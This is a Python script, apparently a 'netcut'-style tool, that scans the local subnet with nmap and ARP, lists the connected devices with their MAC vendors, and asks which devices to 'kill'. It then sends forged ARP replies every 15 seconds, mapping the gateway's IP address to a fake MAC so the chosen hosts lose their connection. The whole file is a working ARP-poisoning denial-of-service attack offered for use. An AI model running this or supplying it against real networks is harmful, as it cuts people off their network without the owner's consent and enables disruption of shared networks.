from scapy.all import *
from time import sleep
from traceback import print_exc
from nmap import PortScanner
from requests import get
from platform import system 
import netifaces

def get_vendor(mac):
    try:
        res = get(f'https://api.macvendors.com/{mac}')
        return res.text if res.status_code == 200 else "None"
    except Exception as e:
        print_exc()
        return "None"

def get_ip_macs(ips):
    res = []
    nm = PortScanner() 
    nm.scan(hosts=ips,arguments='-sP')
    for host in nm.all_hosts():
        if nm[host].state() == "up":
            if nm[host]['status']['reason'] != "localhost-response":
                res.append((host,nm[host]['addresses'].get('mac'),nm[host]['vendor'].get(nm[host]['addresses'].get('mac'))))
    answers, uans = arping(ips, verbose=0)
    for answer in answers:
        mac = answer[1].hwsrc
        ip  = answer[1].psrc
        if ip not in [ip[0] for ip in res]:
            res.append((ip, mac,get_vendor(mac)))
    return res

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac,iface):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:12:12:12:12:12', pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
if system() == "Windows":
    print(IFACES)
    number = input("Enter index of your interface? \n")
    iface = IFACES.dev_from_index(int(number))
    gateway_ip = iface.ip
    gateway_mac  =  iface.mac
    ip_range = gateway_ip.replace(gateway_ip.split(".")[3],"0/24")
    gateway_ip = iface.ip.replace(gateway_ip.split(".")[3],"1")
elif system() == "Linux":
    ifaces = netifaces.interfaces()
    c = 1
    listifaces = {}
    for iface in ifaces:
        try:
            ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
            listifaces[c] = iface 
            listifaces[f"{c}ip"] = ip
            print(f"{c}) IP: {ip} -> {iface}")
            c+=1
        except:
            pass
    number = int(input("Enter iface number: "))
    gateway_ip = listifaces[f"{number}ip"]
    ip_range = gateway_ip.replace(gateway_ip.split(".")[3],"0/24")
    gateway_ip = gateway_ip.replace(gateway_ip.split(".")[3],"1")
devices = get_ip_macs(ip_range)
print(f"Connected ips on {iface} interface:")
c = 1
devs = {}
for device in devices:
    if device[0] == gateway_ip:
        gateway_mac = device[1]
    devs[c] = device[1]
    devs[f"{c}ip"] = device[0]
    print('%s)\t%s\t%s\t%s' % (c, device[0], device[1],device[2]))
    c+=1

killlist = input("Which devices you need to kill? ex: {1,2,... or 1}\n")

victims = []
if "," in killlist:
    for num in killlist.split(","):
        victims.append([devs[f"{num}ip"],devs[int(num)]])
else:
    victims.append([devs[f"{killlist}ip"],devs[int(killlist)]])

while True:
    for victim in victims:
        poison(victim[0],victim[1],gateway_ip,gateway_mac,iface)
    print(f"Arp poison to {victim[0]} sent!")
    sleep(15)